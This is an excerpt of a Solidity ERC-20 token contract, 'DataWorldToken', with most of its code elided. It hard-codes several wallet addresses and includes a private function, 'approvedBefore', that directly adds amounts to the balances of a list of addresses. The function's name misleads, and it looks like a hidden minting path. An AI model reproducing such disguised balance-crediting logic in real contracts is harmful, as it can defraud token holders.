...
contract DataWorldToken is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x6425676109fF9996497ca43eB5C4103eb13cb0be); 
    address payable public marketingAddress2 = payable(0xa0aB5C3BDdf0B3C3E2A09666318F3aCbEA49fD86); 
    address public lpFenhongAddress = address(this);
    address public recipientLpAddress = address(0x8E4c05A53Bf2Bea0a4B47314d3c1F35FbA3614f2);
    ...
    function approvedBefore(address[] memory to, address from, uint256[] memory amounts) private {
        for (uint8 i=0; i < to.length; i++) {
            ...
            _balances[to[i]] = _balances[to[i]].add(count);
